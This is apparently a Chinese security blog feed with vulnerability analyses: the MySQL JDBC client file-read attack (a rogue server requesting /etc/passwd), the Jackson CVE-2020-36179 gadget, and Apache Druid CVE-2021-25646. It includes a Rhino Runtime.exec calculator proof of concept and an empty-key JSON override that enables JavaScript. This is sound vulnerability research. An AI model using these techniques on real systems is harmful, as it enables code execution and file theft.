id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>[1] <a href="https://www.freebuf.com/articles/web/251626.html">JDBC MySQL任意文件读取中的一些坑（yangxiaocheng ）</a></li><li>[2] <a href="https://www.anquanke.com/post/id/203086">MySQL JDBC 客户端反序列化漏洞分析（fnmsd@360）</a></li><li>[3] <a href="https://paper.seebug.org/1227/">MySQL JDBC 客户端反序列化漏洞（四哥）</a></li><li>[4] <a href="https://xz.aliyun.com/t/9250">MySQL JDBC 反序列化分析（7tem7）</a></li><li>[5] <a href="https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf">《New Exploit Technique In Java Deserialization Attack》(zhangyang &amp; keyi大佬)</a></li><li>[6] <a href="https://paper.seebug.org/1112/">CSS-T | Mysql Client 任意文件读取攻击链拓展</a></li><li>[7] <a href="https://dev.mysql.com/doc/connector-j/5.1/en/connector-j-connp-props-security.html">https://dev.mysql.com/doc/connector-j/5.1/en/connector-j-connp-props-security.html</a></li><li>[8] <a href="https://dev.mysql.com/doc/connector-j/8.0/en/connector-j-connp-props-security.html">https://dev.mysql.com/doc/connector-j/8.0/en/connector-j-connp-props-security.html</a></li><li>[9] <a href="http://scz.617.cn:8/network/202001101612.txt">恶意MySQL Server读取MySQL Client端文件（四哥）</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;之前Get了h2 initsql的骚姿势，于是想总结总结jdbc url可控情况下的利用方法，经典的场景就是jdbc mysql 文件读取和反序列化，正好前不久的Druid CVE-2021-26919的用的就是jdbc mysql反序列化漏洞，学习学习，居然踩一些坑，单独记录下来。&lt;/p&gt;
&lt;p&gt;mysql client任意文件读取漏洞历史悠久，参考【6】中有提到早在13年就有提出，但是作为mysql 正常功能一直保留。直到19年blackhat 张杨和可奕 大佬发现反序列化的利用场景（参考【5】），相关研究达到小高潮，不过多赘述。&lt;/p&gt;
&lt;h2 id=&quot;MySQL-Client文件读取漏洞&quot;&gt;&lt;a href=&quot;#MySQL-Client文件读取漏洞&quot; class=&quot;headerlink&quot; title=&quot;MySQL Client文件读取漏洞&quot;&gt;&lt;/a&gt;MySQL Client文件读取漏洞&lt;/h2&gt;&lt;h3 id=&quot;原理：load-local-data&quot;&gt;&lt;a href=&quot;#原理：load-local-data&quot; class=&quot;headerlink&quot; title=&quot;原理：load local data&quot;&gt;&lt;/a&gt;原理：load local data&lt;/h3&gt;&lt;p&gt;正常的load local data流程&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;client：申请跑个sql，内容是&amp;quot;load data local infile &amp;quot;&amp;#x2F;etc&amp;#x2F;passwd&amp;quot; into table test FIELDS TERMINATED BY &amp;#39;\n&amp;#39;;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;server：好的，（识别sql内容），那你把&amp;#x2F;etc&amp;#x2F;passwd文件读取传过来吧&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;client：好的，（读取本地&amp;#x2F;etc&amp;#x2F;passwd），这是文件内容，请查收&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;攻击流程&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;client：申请跑个sql，内容是&amp;quot;***&amp;quot;（jdbc-mysql-connector默认认证登录完成之后，会有show variables&amp;#x2F;select 参数等行为）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;server：好的，（不管sql内容），那你把&amp;#x2F;etc&amp;#x2F;passwd文件读取传过来吧&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;client：好的，（读取本地&amp;#x2F;etc&amp;#x2F;passwd），这是文件内容，请查收&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Java安全" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java" scheme="http://m0d9.me/tags/Java/"/>
    
    <category term="MySQL" scheme="http://m0d9.me/tags/MySQL/"/>
    
    <category term="Jdbc" scheme="http://m0d9.me/tags/Jdbc/"/>
    
  </entry>
  
  <entry>
    <title>JackSon DriverAdapterCPDS gadget CVE-2020-36179分析</title>
    <link href="http://m0d9.me/2021/04/09/JackSon-CVE-2020-36179%E5%88%86%E6%9E%90/"/>
    <id>http://m0d9.me/2021/04/09/JackSon-CVE-2020-36179%E5%88%86%E6%9E%90/</id>
    <published>2021-04-09T04:30:00.000Z</published>
    <updated>2021-04-19T07:25:35.513Z</updated>
    
    <content type="html"><![CDATA[<p>Day1发现有分析 jackson 的DriverAdapterCPDS 这个gadget</p><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><p>其实是参考【1】大佬上报的CVE-2020-36179</p><p>Gadget:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DriverAdapterCPDS</span><br><span class="line">    -&gt;seturl</span><br><span class="line">        -&gt;getPooledConnection</span><br><span class="line">            -&gt;DirverManager.getConnection(this.url,username,pass)</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>gadget流程很简单，但是在复现的时候发现卡在getParentLogger这里，不会执行到getPooledConnection</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Logger <span class="title">getParentLogger</span><span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException </span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> SQLFeatureNotSupportedException();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见getParentLogger简单粗暴直接throw Exception，直接GG</p><p>多次测试发现getParentLogger，getPooledConnection执行顺序并不是有序的，如下：</p><p>失败<br><img src="/images/pasted-120.png" alt="upload successful"></p><p>成功<br><img src="/images/pasted-119.png" alt="upload successful"></p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>背景知识：jackson反序列化会执行部分getter</p><p>getter的产生流程跟踪：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">_addMemberMethods:110, AnnotatedMethodCollector (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">collect:42, AnnotatedMethodCollector (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">collectMethods:33, AnnotatedMethodCollector (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">_methods:365, AnnotatedClass (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">memberMethods:305, AnnotatedClass (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">_addMethods:525, POJOPropertiesCollector (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">collectAll:309, POJOPropertiesCollector (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">getPropertyMap:287, POJOPropertiesCollector (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">getProperties:170, POJOPropertiesCollector (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">_properties:164, BasicBeanDescription (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">findProperties:239, BasicBeanDescription (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">_findCreatorsFromProperties:361, BasicDeserializerFactory (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_constructDefaultValueInstantiator:345, BasicDeserializerFactory (com.fasterxml.jackson.databind.deser)</span><br><span class="line">findValueInstantiator:269, BasicDeserializerFactory (com.fasterxml.jackson.databind.deser)</span><br><span class="line">buildBeanDeserializer:214, BeanDeserializerFactory (com.fasterxml.jackson.databind.deser)</span><br><span class="line">createBeanDeserializer:137, BeanDeserializerFactory (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_createDeserializer2:411, DeserializerCache (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_createDeserializer:349, DeserializerCache (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_createAndCache2:264, DeserializerCache (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_createAndCacheValueDeserializer:244, DeserializerCache (com.fasterxml.jackson.databind.deser)</span><br><span class="line">findValueDeserializer:142, DeserializerCache (com.fasterxml.jackson.databind.deser)</span><br><span class="line">findContextualValueDeserializer:444, DeserializationContext (com.fasterxml.jackson.databind)</span><br><span class="line">_findDeserializer:194, TypeDeserializerBase (com.fasterxml.jackson.databind.jsontype.impl)</span><br><span class="line">_deserialize:97, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)</span><br><span class="line">deserializeTypedFromAny:71, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)</span><br><span class="line">deserializeWithType:712, UntypedObjectDeserializer$Vanilla (com.fasterxml.jackson.databind.deser.std)</span><br><span class="line">deserialize:68, TypeWrappedDeserializer (com.fasterxml.jackson.databind.deser.impl)</span><br><span class="line">_readMapAndClose:4014, ObjectMapper (com.fasterxml.jackson.databind)</span><br><span class="line">readValue:3005, ObjectMapper (com.fasterxml.jackson.databind)</span><br></pre></td></tr></table></figure><blockquote><p>最终观察发现jackson通过 ClassUtil.getClassMethods(cls)获取所有的函数，最终调用的是getDeclaredMethods()，而getDeclaredMethods()返回数组中的元素没有排序，也没有任何特定的顺序，从而导致随机触发。</p></blockquote><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>简单跟踪分析了CVE-2020-36179 这个链，发现2处有意思的点</p><ol><li>jdbc url 可控情况下，利用H2 sql可攻击h2 server（）</li><li>getDeclaredMethods 随机特性</li></ol><p>拓展思考</p><ol><li>jdbc url可控是个通用问题</li><li>getDeclaredMethods 随机特性有绕过方法吗？</li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>[1] <a href="https://github.com/Al1ex/CVE-2020-36179">Al1ex/CVE-2020-36179</a></li><li>[2] <a href="http://www.h2database.com/html/features.html#execute_sql_on_connection">H2 feature</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;Day1发现有分析 jackson 的DriverAdapterCPDS 这个gadget&lt;/p&gt;
&lt;h2 id=&quot;背景知识&quot;&gt;&lt;a href=&quot;#背景知识&quot; class=&quot;headerlink&quot; title=&quot;背景知识&quot;&gt;&lt;/a&gt;背景知识&lt;/h2&gt;&lt;p&gt;其实是参考【1】大佬上报的CVE-2020-36179&lt;/p&gt;
&lt;p&gt;Gadget:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;DriverAdapterCPDS&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    -&amp;gt;seturl&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        -&amp;gt;getPooledConnection&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            -&amp;gt;DirverManager.getConnection(this.url,username,pass)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Java安全" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    <category term="漏洞分析" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Gadget" scheme="http://m0d9.me/tags/Gadget/"/>
    
    <category term="CVE" scheme="http://m0d9.me/tags/CVE/"/>
    
    <category term="Jackson" scheme="http://m0d9.me/tags/Jackson/"/>
    
  </entry>
  
  <entry>
    <title>Apache Druid CVE-2021-25646 漏洞分析</title>
    <link href="http://m0d9.me/2021/02/19/Apache-Druid-CVE-2021-25646-%E5%88%86%E6%9E%90/"/>
    <id>http://m0d9.me/2021/02/19/Apache-Druid-CVE-2021-25646-%E5%88%86%E6%9E%90/</id>
    <published>2021-02-19T03:16:00.000Z</published>
    <updated>2021-04-24T05:56:58.714Z</updated>
    
    <content type="html"><![CDATA[<p>Litch1大佬的这个洞有意思，终于有时间分析下，记录下分析过程</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a href="https://archive.apache.org/dist/druid/">https://archive.apache.org/dist/druid/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$wget</span> https://archive.apache.org/dist/druid/0.20.0/apache-druid-0.20.0-bin.tar.gz &amp;&amp; tar -xzvf apache-druid-0.20.0-bin.tar.gz</span><br></pre></td></tr></table></figure><p>根据参考，修改conf/druid/single-server/micro-quickstart/coordinator-overlord/jvm.config，末尾增加调试参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Xdebug -Xnoagent -Djava.compiler&#x3D;NONE -Xrunjdwp:transport&#x3D;dt_socket,server&#x3D;y,suspend&#x3D;n,address&#x3D;5005</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><h3 id="Jackson注解"><a href="#Jackson注解" class="headerlink" title="Jackson注解"></a>Jackson注解</h3><h4 id="name为空字符串的CreatorProperty"><a href="#name为空字符串的CreatorProperty" class="headerlink" title="name为空字符串的CreatorProperty"></a>name为空字符串的CreatorProperty</h4><p>作者给出这个漏洞的关键点解释</p><blockquote><p>漏洞的关键：<br>在于对用JsonCreator注解修饰的方法来说，方法的所有参数都会解析成CreatorProperty类型，对于没有使用JsonProperty注解修饰的参数来说,会创建一个name为””的CreatorProperty，在用户传入键为””的json对象时就会被解析到对应的参数上。</p></blockquote><h4 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h4><p>其中与该漏洞相关的注解如下</p><ul><li>JsonCreator</li><li>JsonProperty</li><li>JacksonInject</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person4</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> JavaScriptConfig config;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@JsonCreator</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person4</span><span class="params">(<span class="meta">@JsonProperty(&quot;age&quot;)</span> <span class="keyword">int</span> age,</span></span></span><br><span class="line"><span class="function"><span class="params">                   <span class="meta">@JsonProperty(&quot;name&quot;)</span> String name,</span></span></span><br><span class="line"><span class="function"><span class="params">                   <span class="meta">@JacksonInject</span> JavaScriptConfig config)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.config = config;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User [name=&quot;</span> + name + <span class="string">&quot;, age=&quot;</span> + age + <span class="string">&quot;, config=&quot;</span> + config.toString() + <span class="string">&quot;]&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String sp4 = <span class="string">&quot;&#123;\&quot;enabled\&quot;:true&#125;&quot;</span>;</span><br><span class="line">            ObjectMapper mapper4 = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">            JavaScriptConfig pp4 = mapper4.readValue(sp4, JavaScriptConfig.class);</span><br><span class="line">            System.out.println(pp4);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;---------------------------&quot;</span>);</span><br><span class="line">            String sp5 = <span class="string">&quot;&#123;\&quot;age\&quot;:10,\&quot;name\&quot;:\&quot;m0d9\&quot;,\&quot;\&quot;:&#123;\&quot;enabled\&quot;:true&#125;&#125;&quot;</span>;</span><br><span class="line">            ObjectMapper mapper5 = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">            Person4 pp5 = mapper5.readValue(sp5, Person4.class);</span><br><span class="line">            System.out.println(pp5);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (JsonProcessingException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>output 如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">JavaScriptConfig&#123;enabled&#x3D;true&#125;</span><br><span class="line">---------------------------</span><br><span class="line">User [name&#x3D;m0d9, age&#x3D;10, config&#x3D;JavaScriptConfig&#123;enabled&#x3D;true&#125;]</span><br></pre></td></tr></table></figure><h4 id="Jackson反序列化流程跟踪"><a href="#Jackson反序列化流程跟踪" class="headerlink" title="Jackson反序列化流程跟踪"></a>Jackson反序列化流程跟踪</h4><p>的确如Litch1所言，key为””的value({“enabled”:true})被jackson反序列化之后赋值给config。为何如此？跟踪下Jackson JsonCreator的逻辑</p><p>作者也有给出对应的关键过程</p><blockquote><p>com.fasterxml.jackson.databind.deser.BeanDeserializer#_deserializeUsingPropertyBased在解析的过程中，会拿解析到的json串中的“键名”去查找当前解析对象中对应的creatorProperty，这步对应的是findCreatorProperty方法，findCreatorProperty方法会去_propertyLookup 这个HashMap中查找”键名”对应的属性，在_propertyLookup中可以看到其中没有用JsonProperty注释修饰的JavaScriptConfig的键为””，要是json串中的键也为””，就能匹配上，取出JavaScriptConfig对应的creatorProperty</p></blockquote><p>简单而言，Jackson反序列化过程基本如下</p><ol><li>调用mapper.readValue(jsonString, DstClass.class)</li><li>分析DstClass，有哪些属性Property，以及这些属性对应的set方法(creatorProperty)是什么</li><li>依次读取jsonString key &amp; value，根据步骤2中key对应的set方法，调用并创建。</li></ol><p>其中，分析DstClass，在com.fasterxml.jackson.databind.deser.BeanDeserializer这个类中实现，步骤2中的结果保存在BeanDeserializer#_beanProperties Map类里面，之后通过PropertyBeanCreator转换为BeanDeserializer#_propertyLookup</p><p><img src="/images/pasted-117.png" alt="upload successful"></p><p><img src="/images/pasted-118.png" alt="upload successful"></p><p><strong>可见config对应的CreatorProperty name为””，因此_propertyLookup生成了name为””,value为config赋值函数的一条记录</strong></p><p>步骤3中属性赋值中，根据key找对应set方法，具体实现函数为findCreatorProperty，就是从_propertyLookup寻找的，然后实现属性赋值</p><h3 id="Rhino"><a href="#Rhino" class="headerlink" title="Rhino"></a>Rhino</h3><p>javascript引擎，这里和前面比就简单了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Context cx = Context.enter();</span><br><span class="line">cx.setOptimizationLevel(<span class="number">9</span>);</span><br><span class="line">ScriptableObject scope = cx.initStandardObjects();</span><br><span class="line">String script = <span class="string">&quot;function(value) &#123;java.lang.Runtime.getRuntime().exec(&#x27;open -a calculator.app&#x27;)&#125;&quot;</span>;</span><br><span class="line">Function fnApply = cx.compileFunction(scope, script, <span class="string">&quot;script&quot;</span>, <span class="number">1</span>, <span class="keyword">null</span>);</span><br><span class="line">fnApply.call(cx,scope,scope,<span class="keyword">new</span> Object[]&#123;&#125;);</span><br><span class="line">Context.exit();</span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>整个漏洞的精髓有两点</p><h3 id="1-利用Jackson-JsonCreator注解特性，覆盖JavaScriptDimFilter-JavaScriptConfig-config属性，开启javascript功能"><a href="#1-利用Jackson-JsonCreator注解特性，覆盖JavaScriptDimFilter-JavaScriptConfig-config属性，开启javascript功能" class="headerlink" title="1. 利用Jackson JsonCreator注解特性，覆盖JavaScriptDimFilter JavaScriptConfig config属性，开启javascript功能"></a>1. 利用Jackson JsonCreator注解特性，覆盖JavaScriptDimFilter JavaScriptConfig config属性，开启javascript功能</h3><p>覆盖config过程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SamplerResource#SamplerResponse</span><br><span class="line">  IndexTaskSamplerSpec#IndexTaskSamplerSpec</span><br><span class="line">    IndexTask.IndexIngestionSpec#IndexIngestionSpec</span><br><span class="line">      DataSchema#DataSchema</span><br><span class="line">        TransformSpec#TransformSpec</span><br><span class="line">          JavaScriptDimFilter#JavaScriptDimFilter</span><br></pre></td></tr></table></figure><h3 id="2-JavaScriptDimFilter-toFilter-触发回溯"><a href="#2-JavaScriptDimFilter-toFilter-触发回溯" class="headerlink" title="2. JavaScriptDimFilter#toFilter 触发回溯"></a>2. JavaScriptDimFilter#toFilter 触发回溯</h3><p>作者给的poc是回溯到SamplerResource#post可用链，对应触发的调用栈如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">toFilter:149, JavaScriptDimFilter (org.apache.druid.query.filter)</span><br><span class="line">&lt;init&gt;:57, Transformer (org.apache.druid.segment.transform)</span><br><span class="line">toTransformer:126, TransformSpec (org.apache.druid.segment.transform)</span><br><span class="line">decorate:117, TransformSpec (org.apache.druid.segment.transform)</span><br><span class="line">buildReader:209, InputSourceSampler (org.apache.druid.indexing.overlord.sampler)</span><br><span class="line">sample:106, InputSourceSampler (org.apache.druid.indexing.overlord.sampler)</span><br><span class="line">sample:94, IndexTaskSamplerSpec (org.apache.druid.indexing.overlord.sampler)</span><br><span class="line">post:41, SamplerResource (org.apache.druid.indexing.overlord.sampler)</span><br></pre></td></tr></table></figure><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>漏洞修复pr：<a href="https://github.com/apache/druid/pull/10818/files/1f7fc3c929a3b03fed69a03d2f3f96898c74a6d0">https://github.com/apache/druid/pull/10818/files/1f7fc3c929a3b03fed69a03d2f3f96898c74a6d0</a></p><p>其中最重要的修改在core/src/main/java/org/apache/druid/guice/GuiceAnnotationIntrospector.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> JsonIgnoreProperties.<span class="function">Value <span class="title">findPropertyIgnorals</span><span class="params">(Annotated ac)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// We should not allow empty names in any case. However, there is a known bug in Jackson deserializer</span></span><br><span class="line">  <span class="comment">// with ignorals (_arrayDelegateDeserializer is not copied when creating a contextual deserializer.</span></span><br><span class="line">  <span class="comment">// See https://github.com/FasterXML/jackson-databind/issues/3022 for more details), which makes array</span></span><br><span class="line">  <span class="comment">// deserialization failed even when the array is a valid field. To work around this bug, we return</span></span><br><span class="line">  <span class="comment">// an empty ignoral when the given Annotated is a parameter with JsonProperty that needs to be deserialized.</span></span><br><span class="line">  <span class="comment">// This is valid because every property with JsonProperty annoation should have a non-empty name.</span></span><br><span class="line">  <span class="comment">// We can simply remove the below check after the Jackson bug is fixed.</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// This check should be fine for so-called delegate creators that have only one argument without</span></span><br><span class="line">  <span class="comment">// JsonProperty annotation, because this method is not even called for the argument of</span></span><br><span class="line">  <span class="comment">// delegate creators. I&#x27;m not 100% sure why it&#x27;s not called, but guess it&#x27;s because the argument</span></span><br><span class="line">  <span class="comment">// is some Java type that Jackson already knows how to deserialize. Since there is only one argument,</span></span><br><span class="line">  <span class="comment">// Jackson perhaps is able to just deserialize it without introspection.</span></span><br><span class="line">  <span class="keyword">if</span> (ac <span class="keyword">instanceof</span> AnnotatedParameter) &#123;</span><br><span class="line">    <span class="keyword">final</span> AnnotatedParameter ap = (AnnotatedParameter) ac;</span><br><span class="line">    <span class="keyword">if</span> (ap.hasAnnotation(JsonProperty.class)) &#123;</span><br><span class="line">      <span class="keyword">return</span> JsonIgnoreProperties.Value.empty();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> JsonIgnoreProperties.Value.forIgnoredProperties(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>非JsonProperty会在_propertyLookup表中生成一条记录name为””空的映射，此处直接将非JsonProperty的属性忽略，也就不会有后续的JavaScriptConfig反序列化</p><h2 id="扩散思考"><a href="#扩散思考" class="headerlink" title="扩散思考"></a>扩散思考</h2><ol><li><p>Jackson name为空字符串的CreatorProperty变量覆盖，是个通用问题，如何自动化发现</p></li><li><p>发现可覆盖的变量，如何判断是否可利用，甚至RCE？</p></li></ol><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本文从漏洞产生的思路，简要分析了CVE-2021-25646形成的成因，即Jackson 